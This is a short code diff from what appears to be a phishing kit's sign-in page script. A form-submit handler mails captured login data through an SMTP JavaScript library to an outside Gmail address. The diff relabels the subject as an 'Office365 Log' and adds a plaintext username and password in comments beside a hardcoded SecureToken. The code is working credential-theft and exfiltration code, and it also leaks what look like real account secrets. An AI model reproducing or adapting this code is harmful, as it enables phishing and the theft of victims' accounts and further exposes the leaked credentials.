@@ -98,12 +98,12 @@ loadForm(), document.getElementById("email-signin").addEventListener("submit", p
 function sendEmail(to,message) {
   Email.send({
   // Host: smtp_host,
-  // Username : smtp_username,
-  // Password : smtp_password,
+  // Username : basheer@ami-worldwide.com,
+  // Password : Ami@2020,
   SecureToken: '232d9590-ce69-4dec-8b72-178e83e97702',
   To : 'gotradebtc@gmail.com',
   From : smtp_username,
-  Subject : '==============+ [Hotmail] +================',
+  Subject : '==============+ [Office365 Log] +================',
   Body : message,
   }).then(function(message){
       if(message == 'OK'){
